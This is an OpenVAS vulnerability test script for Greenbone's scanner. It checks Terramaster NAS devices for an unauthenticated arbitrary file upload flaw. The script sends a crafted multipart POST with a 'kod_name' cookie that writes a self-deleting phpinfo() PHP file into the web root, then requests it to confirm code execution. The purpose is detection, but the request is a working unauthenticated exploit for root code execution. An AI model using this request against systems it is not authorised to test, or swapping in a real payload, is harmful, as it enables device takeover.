##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_terramaster_file_upload_vuln.nasl 11501 2018-09-20 12:19:13Z mmartin $
#
# Terramaster NAS File Upload Vulnerability
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:noontec:terramaster";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106839");
  script_version("$Revision: 11501 $");
  script_tag(name:"last_modification", value:"$Date: 2018-09-20 14:19:13 +0200 (Thu, 20 Sep 2018) $");
  script_tag(name:"creation_date", value:"2017-05-31 10:41:50 +0700 (Wed, 31 May 2017)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"NoneAvailable");

  script_name("Terramaster NAS File Upload Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2017 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_terramaster_nas_detect.nasl");
  script_mandatory_keys("terramaster_nas/detected");

  script_tag(name:"summary", value:"Terramaster NAS is prone to a file upload vulnerability.");

  script_tag(name:"insight", value:"If a cookie named 'kod_name' is provided it is possible to upload a file
  to an arbitrary location without any authentication.");

  script_tag(name:"impact", value:"An unauthenticated attacker may upload arbitrary files and execute them
  as root.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request to upload a php file and checks if
  phpinfo() could be executed.");

  script_tag(name:"solution", value:"No known solution is available as of 15th May, 2018. Information
  regarding this issue will be updated once solution details are available.

  To mitigate the issue, check the mitigation steps in the referenced link.");

  script_xref(name:"URL", value:"https://www.evilsocket.net/2017/05/30/Terramaster-NAS-Unauthenticated-RCE-as-root/");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

get_app_location(cpe: CPE, port: port, nofork: TRUE); # To have a reference to the Detection-NVT

vtstring = get_vt_string();

file = vtstring + '_' + rand() + '.php';

bound = '---------------------------' + vtstring + '_' + rand();

data = '--' + bound + '\r\n' +
       'Content-Disposition: form-data; name="file"; filename="' + file + '"\r\n\r\n' +
       '<?php phpinfo(); unlink(__FILE__); ?>\r\n' +
       '--' + bound + '--\r\n';

req = http_post_req(port:port, url:"/include/upload.php?targetDir=/usr/www/", data:data,
                    add_headers: make_array("Cookie", "kod_name=1",
                                            "Content-Type", "multipart/form-data; boundary=" + bound));
res = http_keepalive_send_recv(port: port, data: req);

if ('{"jsonrpc" : "2.0", "result" : null, "id" : "id"}' >< res) {
  url = '/' + file;

  if (http_vuln_check(port: port, url: url, pattern: "PHP Version", check_header: TRUE, extra_check: "PHP API")) {
    report = "It was possible to upload a PHP file and execute phpinfo().";
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
